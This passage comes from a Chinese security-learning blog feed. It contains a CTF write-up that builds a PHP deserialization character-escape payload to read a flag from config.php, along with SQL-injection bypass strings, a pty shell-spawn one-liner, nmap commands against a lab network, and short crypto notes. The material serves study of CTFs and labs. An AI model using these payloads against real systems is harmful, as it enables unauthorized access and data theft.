class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$config</span>);</span><br></pre></td></tr></table></figure>
<p>require(‘config.php’)将会加载名为config.php的文件的内容，该文件通常包含了一些配置信息。<br>class一般都是重要函数函数调用和数据库查询需要用到的文件。class中包含了 config.php 去看看config.php。<br><code>config.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看到这里有个flag  应该是要class调用 config.php进行读取了。<br>经过前面,我们的的思路就是,注册账号然后登录，然后update 更新自己的信息，我们通过源码看到profile通过update.php经过POST传入phone，email，nickname，photo四个参数，而其中的<code>photo参数具有文件读取的函数功能</code>，所以我们直接让它读取config.php文件即可获得flag。<br><code>下列知识点才是干货</code></p>
<h3 id="如何构造payload"><a href="#如何构造payload" class="headerlink" title="如何构造payload"></a>如何构造payload</h3><p>–&gt;<code>字符逃逸</code><br>但由于在update.php中,变量$profile[‘photo’]是文件上传控制的但是被经过md5加密了($photo默认值)，没办法直接传，结合反序列化函数和前面看到的filter的那些正则匹配替换函数，我们可以试着尝试反序列化的字符逃逸。<br>1、在update.php中,对输入的nickname也有正则限制。</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">if(<span class="name">preg_match</span>(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; <span class="number">10</span>)</span><br><span class="line">			die(&#x27;Invalid nickname&#x27;)<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里先对它进行了正则，这个正则的意思是匹配除了a-zA-Z0-9_之外的字符,因为 “^” 符号是在 “[]” 里面，所以是非的意思，不是开始的意思，preg_match只能处理字符串，当传入的subject是数组时会返回false，所以我们传入数组可以绕过。<br>2、还可以发现,在class中,对update的信息存在过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">	<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">	<span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">	<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __class__;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里可以看到把select，insert，update等字符串替换成hacker，其他都是6个字符串，和hacker一样，并不能让字符串增多，<br>但这里有一个where是五个字符串，替换成hacker后相当于多了一个字符，如果我们多写几个where，就能多出多个字符串，多出来的字符串可以构造语句形成字符逃逸。<br>知道了where是关键点,那我要应该怎么构造payload呢？<br>我们可操作的字段应该是nickname,即<code>在nickname后插入photo的关键内容且保证不被丢弃。</code><br>首先思考一个payload:<br>加入我nickname[]的值为public $nickname &#x3D; array(“”;}s:5:”photo”;s:10:”config.php”;}”);<br>那么post传入update时,它自动序列化的payload就是</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;114&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;123@163.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;<span class="selector-tag">a</span>:<span class="number">1</span>:&#123;<span class="selector-tag">i</span>:<span class="number">0</span>;s:<span class="number">34</span>:<span class="string">&quot;&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
<p><code>你应该会疑惑</code><br>1、为什么nickname的string长度为34。<br>答:首先34:后的””已经是闭合的了,长度为0,但是序列化长度不可为0(<code>正常情况下可以,但是当序列化非空数组或对象时，序列化的字符串长度将大于0。</code>)。那么所以name只能认为”;}s:5:”photo”;s:10:”config.php”;}当作了name的值，这个序列化字符串才能成功反序列化,所以长度为34。<br>2、这里的photo是nickname的一部分,不可以帮助我们解析处flag,所以,我们就要使用一些方法,把这个$photo从nickname剥离出来。<br><code>所以要用到字符逃逸绕过。</code><br>“;}s:5:”photo”;s:10:”config.php”;}<br>我们要让序列化后的内容可以接受以上34个字符。<br>我们可以想到,由于在class.php内,把select，insert，update、where等字符串替换成hacker。<br>那么我们可以借助34个where扩充34个位置。<br>1、如果对方网站没有序列化:<br>那么构造最终payload的代码如下(删掉变量photo)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$phone</span> = <span class="string">&quot;18148881156&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$email</span> = <span class="string">&quot;123@163.com&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$nickname</span> = <span class="keyword">array</span>(<span class="string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;<span class="string">&quot;);//34个where,把photo包含进nickname。</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$a</span>=new b();</span></span><br><span class="line"><span class="string"><span class="subst">$payload</span>=serialize(<span class="subst">$a</span>);</span></span><br><span class="line"><span class="string">echo <span class="subst">$payload</span>;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>尴尬的是,这串代码运不了,那我们就手动构造payload。<br><code>o:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:11:&quot;123@163.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code><br>这样,传输到对方网站后端时,在where被正则匹配换成hacker之后，正好满足长度(成功把数组闭合掉)，然后后面的”};s:5:“photo”;s:10:“config.php”;}也就不是nickname的一部分了，被反序列化的时候就会被当成photo，就可以读取到config.php的内容了。<br>到达对方网站后端时,由于对面网站存在对where的过滤,那么每存在一个where,就会逃逸一个字符,借对方的过滤代码帮我们还原了,哈哈。而且,之前提到的那个$photo默认值,此时也被丢弃啦!<br>2、这里由于update.php已经存在了序列化,那么我们实际的payload为:<br><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code><br>这样抓包修改即可,不赘述,最后查看源码,再base64解码以下即可。<br>这道题我做了一天,感觉挺恶心的。</p>
<p><code>后记</code><br>一些以前遗漏的知识点(php反序列化绕过姿势-进阶):<br>特点1：<br>php在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾，并且是根据长度判断内容的 ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 ，超出的部分并不会被反序列化成功，这说明反序列化的过程是有一定识别范围的，在这个范围之外的字符都会被忽略，不影响反序列化的正常进行。而且可以看到反序列化字符串都是以”;}结束的，那如果把”;}添入到需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就相应的丢弃了。<br>特点2：<br>长度不对应会报错<br>漏洞产生：<br>反序列化之所以存在字符逃逸，最主要的原因是代码中存在针对序列化（serialize()）后的字符串进行了过滤操作（变多或者变少）。<br>漏洞常见条件：<br>序列化后过滤再去反序列化<br>from:<br><code>感觉这两篇学习绕过姿势的文章都挺好,强烈安利</code><br><a href="https://zhuanlan.zhihu.com/p/628402113">https://zhuanlan.zhihu.com/p/628402113</a><br><a href="https://blog.csdn.net/m0_64815693/article/details/127982134">https://blog.csdn.net/m0_64815693/article/details/127982134</a><br><code>特别鸣谢</code><br><a href="https://zhuanlan.zhihu.com/p/628402113">https://zhuanlan.zhihu.com/p/628402113</a><br><a href="https://www.jb51.net/article/180496.htm">https://www.jb51.net/article/180496.htm</a></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>对称密码以及非对称密码</title>
    <url>/2023/10/16/serectADR/</url>
    <content><![CDATA[<h2 id="对称密钥加密"><a href="#对称密钥加密" class="headerlink" title="对称密钥加密"></a>对称密钥加密</h2><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>AES（Advanced Encryption Standard，高级加密标准）算法，是一种对称密钥加密算法，用于保护敏感数据的机密性。它是目前广泛应用的加密算法之一，被认为是最安全的对称加密算法之一。<br>AES基本概要:<a href="https://blog.csdn.net/m0_72410588/article/details/132449867">https://blog.csdn.net/m0_72410588/article/details/132449867</a></p>
<h4 id="原理以及结构"><a href="#原理以及结构" class="headerlink" title="原理以及结构"></a>原理以及结构</h4><p>1、AES算法采用分组密码的形式，将明文数据划分为固定长度（128比特）的数据块，并通过多轮的加密操作，将明文转换为密文。AES算法具有三种不同的密钥长度：128比特、192比特和256比特，分别对应AES-128、AES-192和AES-256。<br>2、AES 的加密公式为 C&#x3D;E(K,P)，其中 K 为密钥，P 为明文，C 为密文。</p>
<h4 id="AES的加密过程"><a href="#AES的加密过程" class="headerlink" title="AES的加密过程"></a>AES的加密过程</h4><p>AES加密过程主要包括以下四个步骤：<br>密钥扩展：根据输入的密钥生成一系列轮密钥，用于后续的轮函数操作。<br>初始轮：将输入数据与第一轮密钥进行异或运算。<br>多轮加密：通过执行多个相同的轮函数，对输入数据进行重复的变换和替代操作。<br>最后一轮：在最后一个轮函数中，不使用MixColumns操作，并将输出数据与最后一轮密钥进行异或运算<br>具体加密过程:<a href="https://www.jianshu.com/p/fff19c19eb09">https://www.jianshu.com/p/fff19c19eb09</a></p>
<h4 id="AES的解密过程"><a href="#AES的解密过程" class="headerlink" title="AES的解密过程"></a>AES的解密过程</h4><p>AES解密过程与加密过程相似，只是逆向执行了加密过程的步骤。通过反向操作，密文可以被还原为明文。</p>
<h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>DES是一种对称加密算法（对称加密即加密和解密用的是同一个秘钥）。<br>DES是一个分组加密算法，就是将明文分组进行加密，每次按顺序取明文一部分，一个典型的DES以64位为分组（明文分为64位明文段，全部64位明文段整合起来就是完整的明文），加密解密用算法相同。它的密钥长度为56位，因为每组第8位是用来做奇偶校验，密钥可以是任意56位的数，保密性依赖于密钥。 DES算法的核心主要包括两部分，第一部分是Feistel结构，第二部分是16个子密钥的生成。</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>DES算法为密码体制中的对称密码体制，⼜被称为美国数据加密标准。DES是⼀个分组加密算法，典型的DES以64位为分组对数据加密，加密和解密⽤的是同⼀个算法。<br>密钥长64位，密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位，使得每个密钥都有奇数个1），分组后的明⽂组和56位的密钥按位替代或交换的⽅法形成密⽂组。<br>参考以及DES具体过程:<br><a href="https://zhuanlan.zhihu.com/p/575214691">https://zhuanlan.zhihu.com/p/575214691</a><br><a href="https://blog.csdn.net/it_is_me_a/article/details/102463573">https://blog.csdn.net/it_is_me_a/article/details/102463573</a><br><a href="https://zhuanlan.zhihu.com/p/530212088">https://zhuanlan.zhihu.com/p/530212088</a><br><code>https://zhuanlan.zhihu.com/p/617663465</code><br><a href="https://zhuanlan.zhihu.com/p/537550343">https://zhuanlan.zhihu.com/p/537550343</a></p>
<h2 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h2><h3 id="与对称加密算法的对比"><a href="#与对称加密算法的对比" class="headerlink" title="与对称加密算法的对比"></a>与对称加密算法的对比</h3><p>对称加密算法：<br>（1）甲方选择某一种加密规则，对信息进行加密；<br>（2）乙方使用同一种规则，对信息进行解密。<br>缺点：甲方必须把加密规则告诉乙方，否则无法解密。保存和传递密钥，就成了最头疼的问题。<br>非对称加密算法:<br>（1）乙方生成两把密钥（公钥和私钥）。公钥(发给对方用于加密数据)是公开的，任何人都可以获得，私钥则是保密的。<br>（2）甲方获取乙方的公钥，然后用它对信息加密。<br>（3）乙方得到加密后的信息，用私钥解密。<br>如果公钥加密的信息只有私钥解得开，那么只要私钥不泄漏，通信就是安全的。</p>
<h3 id="杰出代表–RSA加密算法"><a href="#杰出代表–RSA加密算法" class="headerlink" title="杰出代表–RSA加密算法"></a>杰出代表–RSA加密算法</h3><p>1、重要的概念–密钥对,即是包含一个公钥与一个私钥。<br>2、RSA加密算法的原理:<a href="https://blog.csdn.net/Insect_boy/article/details/130528667">https://blog.csdn.net/Insect_boy/article/details/130528667</a><br>3、加解密原理以及过程:<br>   <a href="https://blog.csdn.net/qq_43013511/article/details/123115880">https://blog.csdn.net/qq_43013511/article/details/123115880</a><br>   <a href="https://blog.csdn.net/chengqiuming/article/details/82725137">https://blog.csdn.net/chengqiuming/article/details/82725137</a><br>4、对称加密与非对称加密的对比以及详解非对称加密:<br><a href="https://zhuanlan.zhihu.com/p/436455172?utm_id=0&wd=&eqid=de46b7d2001e070a00000006645769d0">https://zhuanlan.zhihu.com/p/436455172?utm_id=0&amp;wd=&amp;eqid=de46b7d2001e070a00000006645769d0</a><br>5、按照我的理解就是：<br>Bob发送信息给Alice,首先Alice得把自己的公钥发送给Bob,Bob用这个公钥对信息进行加密然后用自己的私钥对这个加密后的信息进行数字签名。然后Bob把签名后的加密信息以及Bob自己的公钥发送给Alice,Alice收到后,先用Bob的公钥对这个信息进行验证,确认这个信息确实是来自于Bob后,随后用自己的私钥进行解密。<br>6、实现前提,使用单向陷门函数。即加密简单,解密时对于敌手难,对于用户简单。</p>
]]></content>
      <categories>
        <category>应用密码学</category>
      </categories>
      <tags>
        <tag>应用密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入练习遇到的问题</title>
    <url>/2023/10/03/sqlPratice/</url>
    <content><![CDATA[<h2 id="SQL注入练习遇到的问题"><a href="#SQL注入练习遇到的问题" class="headerlink" title="SQL注入练习遇到的问题"></a>SQL注入练习遇到的问题</h2><p>1、报错盲注时(insert与update型),语句的插入位置<br>心得:在解题时,若注册输入的数据是字符串型的(如用户名),则不建议在其后插入(会出现一个截断错误),尽量在纯数字后面(如电话)插入。<br><img src="https://pic.imgdb.cn/item/6522b245c458853aeffc7f61.png" alt="图一" title="一"><br><img src="https://pic.imgdb.cn/item/6522b23ec458853aeffc7df2.png" alt="图二" title="二"><br>2、limit 0,1表示从第一行开始取一个。<br>3、若是删除记录(delete),直接在get请求的参数值(如id)后面注入(报错盲注)。<br>4、注意在bp当中，get请求当中去输入sql语句时，空格用+替代，否则会出现问题。</p>
]]></content>
      <categories>
        <category>Recorder</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>一些俺觉得挺有用的文章分享</title>
    <url>/2023/11/30/tuijian/</url>
    <content><![CDATA[<p><code>对计算机进行简单的安全加固</code><br><a href="https://blog.csdn.net/weixin_50546273/article/details/124374338">https://blog.csdn.net/weixin_50546273/article/details/124374338</a><br><code>正向连接以及反向连接</code><br><a href="https://blog.csdn.net/qq_44159028/article/details/120748587">https://blog.csdn.net/qq_44159028/article/details/120748587</a><br><a href="https://zhuanlan.zhihu.com/p/639608850">https://zhuanlan.zhihu.com/p/639608850</a><br><code>sql注入中的转义符</code><br><a href="https://blog.csdn.net/lzu_lfl/article/details/129717185">https://blog.csdn.net/lzu_lfl/article/details/129717185</a><br><code>kali-sqlmap</code><br><a href="https://blog.csdn.net/2201_76034619/article/details/131436295">https://blog.csdn.net/2201_76034619/article/details/131436295</a><br><code>sqlmap命令大全</code><br><a href="https://blog.csdn.net/qq_45719090/article/details/129241110">https://blog.csdn.net/qq_45719090/article/details/129241110</a><br><code>linuxSUID提权</code><br><a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a><br><code>linux用户以及用户组知识</code><br><a href="https://zhuanlan.zhihu.com/p/75138904?utm_id=0">https://zhuanlan.zhihu.com/p/75138904?utm_id=0</a><br><code>Linux 命令之who、who am i、whoami 的区别</code><br><a href="https://www.jianshu.com/p/669eb9435da4">https://www.jianshu.com/p/669eb9435da4</a><br><code>打开交互式的终端</code><br>开一个虚拟的交互终端</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>
<p><code>php伪协议</code><br><a href="https://blog.csdn.net/m0_56107268/article/details/127760614">https://blog.csdn.net/m0_56107268/article/details/127760614</a><br><a href="https://www.php.cn/faq/481803.html">https://www.php.cn/faq/481803.html</a><br><a href="https://fzsecurity-github.github.io/2023/12/13/phpWeiXieYi/">https://fzsecurity-github.github.io/2023/12/13/phpWeiXieYi/</a><br><code>html编码网站--xss</code><br><a href="https://config.net.cn/tools/HtmlEncode.html">https://config.net.cn/tools/HtmlEncode.html</a><br><code>windows反弹shell的方法</code><br><a href="https://blog.csdn.net/hackzkaq/article/details/123049915">https://blog.csdn.net/hackzkaq/article/details/123049915</a><br><a href="https://www.jianshu.com/p/1a9ff74fee48">https://www.jianshu.com/p/1a9ff74fee48</a><br><code>红队实战演练环境：</code><br><a href="https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug">https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug</a> 提取码：taqu<br><code>一些文件上传绕过过滤小寄巧</code><br>基础的绕过：<a href="https://blog.csdn.net/qq_49893996/article/details/129430347">https://blog.csdn.net/qq_49893996/article/details/129430347</a><br>数据溢出|符号变异：<a href="https://blog.csdn.net/qq_53079406/article/details/123525882">https://blog.csdn.net/qq_53079406/article/details/123525882</a><br><a href="https://blog.csdn.net/guanjian_ci/article/details/123018671">https://blog.csdn.net/guanjian_ci/article/details/123018671</a><br><code>PHP代码执行中出现过滤限制的绕过执行方法</code><br><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a><br><code>sql注入绕过技巧</code><br><a href="https://zhuanlan.zhihu.com/p/627597743?utm_id=0">https://zhuanlan.zhihu.com/p/627597743?utm_id=0</a><br><a href="https://blog.csdn.net/m0_63306943/article/details/130448875">https://blog.csdn.net/m0_63306943/article/details/130448875</a><br><a href="https://www.cnblogs.com/croot/p/3450262.html">https://www.cnblogs.com/croot/p/3450262.html</a><br><code>msf使用寄巧</code><br><a href="https://blog.csdn.net/qq_44657899/article/details/108804127">https://blog.csdn.net/qq_44657899/article/details/108804127</a><br><a href="https://blog.csdn.net/weixin_49349476/article/details/131096109">https://blog.csdn.net/weixin_49349476/article/details/131096109</a><br><code>nmap寄巧</code><br><a href="https://wooyun.js.org/drops/nmap%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93.html">https://wooyun.js.org/drops/nmap%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93.html</a><br>-from kc</p>
]]></content>
      <categories>
        <category>share</category>
      </categories>
      <tags>
        <tag>share</tag>
      </tags>
  </entry>
  <entry>
    <title>初步理解SQL注入（一）</title>
    <url>/2023/09/11/two/</url>
    <content><![CDATA[<h2 id="初步理解SQL注入（一）"><a href="#初步理解SQL注入（一）" class="headerlink" title="初步理解SQL注入（一）"></a>初步理解SQL注入（一）</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">爆库:获取数据库名</span></span><br><span class="line"><span class="section">爆表:获取表名</span></span><br></pre></td></tr></table></figure>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>SQL注入的原理是利用应用程序在构建SQL查询语句时未对用户输入进行充分的验证和过滤。<br>攻击者可以通过在输入字段中插入特殊字符或SQL语句片段，改变原始的SQL查询逻辑，从而执行恶意操作。</p>
<h3 id="分类–严格意义来说这样分类是错误的，应该用数据库名命名"><a href="#分类–严格意义来说这样分类是错误的，应该用数据库名命名" class="headerlink" title="分类–严格意义来说这样分类是错误的，应该用数据库名命名"></a>分类–严格意义来说这样分类是错误的，应该用数据库名命名</h3><h4 id="基于错误的注入"><a href="#基于错误的注入" class="headerlink" title="基于错误的注入"></a>基于错误的注入</h4><h4 id="盲注注入"><a href="#盲注注入" class="headerlink" title="盲注注入"></a>盲注注入</h4><h4 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h4><h4 id="命令执行注入"><a href="#命令执行注入" class="headerlink" title="命令执行注入"></a>命令执行注入</h4><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p> 攻击者可以通过构造恶意的输入数据，包括SQL语句片段、特殊字符和转义序列等，来利用SQL注入漏洞。<br> 利用的目的可以包括绕过身份验证、获取敏感数据、修改数据库内容或执行任意的操作等。</p>
<h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><p>使用参数化查询或预编译语句，确保输入数据与查询逻辑分离。<br>对用户输入进行严格的验证和过滤，包括输入长度、数据类型和特殊字符等。<br>最小化数据库账户的权限，限制对数据库的操作。<br>定期更新和修补应用程序，以修复已知的SQL注入漏洞。<br>使用Web应用程序防火墙（WAF）等安全工具来检测和阻止SQL注入攻击。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">注入“万能”公式</span><br><span class="line">字符型:</span><br><span class="line">1<span class="string">&#x27; or 1=1 #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="attribute">1</span>=1 #</span><br><span class="line">1<span class="string">&#x27; or 1=1 --   --后面加空格否则报错</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="attribute">1</span>=1 --   --后面加空格否则报错</span><br><span class="line"><span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line"> 数字型:</span><br><span class="line"> 1 <span class="keyword">or</span> <span class="attribute">1</span>=1 #--以此类推</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Lynn&#39;s Tasks</title>
    <url>/2023/12/14/wangluogfBig/</url>
    <content><![CDATA[<p>靶机：192.168.8.2(CentOS);192.168.8.60(win7)<br>攻击机：kali</p>
<h1 id="前期工作-信息收集"><a href="#前期工作-信息收集" class="headerlink" title="前期工作|信息收集"></a>前期工作|信息收集</h1><p>开启两台靶机<br>192.168.8.2：<br><img src="https://pic.imgdb.cn/item/657ef098c458853aefb9bd2f.jpg"><br>192.168.8.60：<br><img src="https://pic.imgdb.cn/item/657ef0a6c458853aefba0fd7.jpg"></p>
<h2 id="判断受害主机ip"><a href="#判断受害主机ip" class="headerlink" title="判断受害主机ip"></a>判断受害主机ip</h2><p>由于我们不知道靶机的ip，我们先nmap扫一下</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sP <span class="number">192.168.8.0</span>/<span class="number">24</span>  </span><br></pre></td></tr></table></figure>
<p>扫到如下存活主机ip<br><img src="https://pic.imgdb.cn/item/657ef0b1c458853aefba51a5.jpg"><br>经过排查，.60|.2这两台是受害靶机。<br>打开看一下，<br>192.168.8.2：<br><img src="https://pic.imgdb.cn/item/657ef0c3c458853aefbaba34.jpg"><br>192.168.8.60：<br><img src="https://pic.imgdb.cn/item/657ef0cfc458853aefbb365f.jpg"><br><code>大致：ip为.60这台主机是个人主机？，ip为.2这台主机是web服务器</code></p>
<h3 id="192-168-8-2"><a href="#192-168-8-2" class="headerlink" title="192.168.8.2"></a>192.168.8.2</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>按照上述思路，先对192.168.8.2这台主机进行端口扫描</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sT -sC -sV -O <span class="number">192.168.8.2</span> </span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/657f00a6c458853aef162401.jpg"><br>熟悉的老朋友：22|80</p>
